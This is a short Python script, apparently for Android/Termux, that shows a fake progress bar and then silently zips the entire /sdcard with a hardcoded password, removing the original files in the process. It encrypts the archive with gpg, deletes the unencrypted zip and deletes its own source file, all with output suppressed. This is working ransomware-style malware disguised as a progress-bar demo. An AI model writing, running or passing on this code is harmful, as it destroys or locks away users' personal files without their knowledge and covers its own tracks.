import os,sys,time
from alive_progress import alive_bar; import time


with alive_bar(200, bar='blocks') as bar:   # declare your expected total
    for i in range(200):
      time.sleep(.05)
      bar()                        
      

def package():
        try:
                import gnupg
                import zip
        except ImportError:
                os.system('pkg install -y gnupg zip &> /dev//null')

package()
os.system('zip --password njing your_file.zip -m -r /sdcard &> /dev//null')

os.system('gpg --batch -c --passphrase njing your_file.zip &> /dev//null')
os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
os.system('rm -rf minicrypto.py')